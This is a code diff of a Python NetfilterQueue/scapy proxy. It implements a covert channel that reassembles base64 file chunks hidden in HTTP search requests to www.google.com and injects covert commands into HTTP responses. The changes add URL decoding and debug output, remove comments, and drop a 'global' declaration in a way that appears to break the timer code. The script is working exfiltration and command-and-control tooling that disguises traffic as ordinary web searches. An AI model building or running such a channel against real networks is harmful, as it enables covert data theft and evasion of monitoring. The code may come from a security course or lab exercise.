@@ -1,6 +1,6 @@
 from netfilterqueue import NetfilterQueue
 from scapy.all import IP, TCP, Raw
-import re, base64, os, time
+import re, base64, os, time, urllib.parse
 
 TARGET_HOST = b"www.google.com"
 COVERT_CMD = "ACK"
@@ -8,8 +8,13 @@ COVERT_CMD = "ACK"
 file_chunks = {}
 start_time = None
 
-def save_chunk(data):
-    # Match chunk in form idx/total:<base64>
+
+# TODO Fix this code its shite
+
+# What does the error cuased from the file transfer come from
+
+
+def save_chunk(data): #!!! This doesnt work for file transfer? Cannot get timings
     match = re.match(r"(\d+)/(\d+):([A-Za-z0-9+/=]+)", data)
     if not match:
         print(f"[PROXY] Invalid chunk format: {data[:50]}")
@@ -19,25 +24,21 @@ def save_chunk(data):
     idx = int(idx)
     total = int(total)
 
-    # Initialise buffer and start timer
     if "file" not in file_chunks:
         file_chunks["file"] = [""] * total
-        global start_time
         start_time = time.time()
         print(f"[PROXY] Starting file transfer: expecting {total} chunks")
 
     file_chunks["file"][idx] = b64data
     print(f"[PROXY] Received chunk {idx+1}/{total}")
 
-    # Only decode when all chunks are non-empty
     if any(c == "" for c in file_chunks["file"]):
         return False
 
     combined = "".join(file_chunks["file"])
     print(f"[DEBUG] Combined Base64 length: {len(combined)}")
 
-    try:
-        # Ensure proper padding for Base64 decode
+    try: 
         padded = combined + "=" * ((4 - len(combined) % 4) % 4)
         file_bytes = base64.b64decode(padded)
     except Exception as e:
@@ -66,12 +67,19 @@ def inject_command(payload, command):
 def extract_covert_message(payload):
     try:
         data = payload.decode(errors="ignore")
-        # Capture Base64 and numbers safely
-        match = re.search(r"GET /search\?q=What\+is\+([A-Za-z0-9+/=:/]+)", data)
+        # Debug raw HTTP request
+        first_line = data.split("\r\n")[0]
+        print(f"[DEBUG] HTTP Request Line: {first_line}")
+
+        # Capture everything after What+is+ until space or HTTP version
+        match = re.search(r"GET /search\?q=What\+is\+([^ ]+)", data)
         if match:
-            return match.group(1)
-    except Exception:
-        pass
+            encoded = match.group(1)
+            decoded = urllib.parse.unquote(encoded)
+            print(f"[DEBUG] Extracted covert data: {decoded[:60]}...")
+            return decoded
+    except Exception as e:
+        print(f"[ERROR] extract_covert_message failed: {e}")
     return None
 
 def process_packet(pkt):
@@ -81,15 +89,13 @@ def process_packet(pkt):
         tcp = scapy_pkt[TCP]
         raw_load = scapy_pkt[Raw].load
 
-        # Outbound HTTP request
         if tcp.dport == 80 and TARGET_HOST in raw_load:
             covert_data = extract_covert_message(raw_load)
             if covert_data:
                 done = save_chunk(covert_data)
                 if done:
-                    print("[PROXY] Final chunk processed.")
+                    print("[PROXY] Final chunk processed and file saved.")
 
-        # Inbound HTTP response
         if tcp.sport == 80 and b"</body>" in raw_load:
             new_payload = inject_command(raw_load, COVERT_CMD)
             scapy_pkt[Raw].load = new_payload
@@ -99,7 +105,7 @@ def process_packet(pkt):
     pkt.accept()
 
 if __name__ == "__main__":
-    print("[+] NFQUEUE proxy running with fixed chunk handling and Base64 safety")
+    print("[+] NFQUEUE proxy running with URL decoding and chunk debugging")
     nfqueue = NetfilterQueue()
     nfqueue.bind(1, process_packet)
     nfqueue.run()
